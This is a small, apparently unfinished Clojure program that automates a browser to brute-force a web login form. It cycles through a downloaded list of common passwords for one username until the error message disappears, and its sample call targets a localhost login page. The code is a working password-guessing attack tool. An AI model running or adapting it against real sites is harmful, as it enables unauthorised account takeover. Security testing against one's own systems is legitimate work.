(ns browser-fuzzer.core
  (:gen-class)
  (:require
   [clojure.java.io :as io]
   [clj-webdriver.taxi :as t]
   [clj-webdriver.firefox :as t-ff]
   [clj-webdriver.core :as t-c]
   [clojure.string :as str]
   ;TODO add parallel fuzzer
   #_[clojure.core.async 
    :as a
    :refer [>! <! >!! <!! go chan buffer close! thread
            alts! alts!! timeout
            pipeline-async]]))

(defn read-file [url])

(defn error-fn [driver]
  (let [error-text (t/attribute driver (t/find-element d {:color "red"}) :text)]
    (str/includes? error-text "Bad credentials")))

(defn fuzz-site [{:keys [site #_error-fn user-field pass-field submit-field username pass-seq]}]
  (let [driver (t/new-driver {:browser :firefox})]
    (loop [i 0]
      (if (>= i (count pass-seq))
        (t/close driver)
        (do
          (t/to driver site)
          (t/wait-until driver #(t/exists? % user-field) 5000 0)
          (t/input-text driver (t/find-element driver user-field) username)
          (t/input-text driver (t/find-element driver pass-field) (nth pass-seq i))
          (t/click driver submit-field)
          (Thread/sleep 500)
          (if-not (error-fn driver)
            (println "Password found: " (nth pass-seq i))
            (recur (inc i))))))))

(defn -main
  "I don't do a whole lot ... yet."
  [& args]
  (println "I'm not used yet! Use REPL"))

(comment

;DEV AREA

(fuzz-site {:site "http://localhost:8080/login"
            :user-field {:name "username"}
            :pass-field {:name "password"}
            :submit-field {:name "submit"}
            :username "ted"
            :pass-seq (str/split-lines (slurp "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt"))
            :error-fn error-fn})

(+ 4 4)

(dotimes [n 5] (t/new-driver {:browser :firefox}))

)
